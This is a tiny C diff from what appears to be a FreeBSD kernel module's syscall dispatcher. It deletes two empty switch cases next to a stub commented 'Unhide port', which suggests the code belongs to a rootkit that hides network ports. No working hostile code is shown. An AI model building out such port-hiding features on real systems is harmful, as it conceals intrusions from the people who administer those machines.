@@ -61,11 +61,6 @@ static int main(struct thread *td, void *syscall_args) {
 			break;
 		case 11://Unhide port
 			break;
-		case 12:
-			break;
-		case 13:
-			break;
-
 		default:
 			break;
 	}
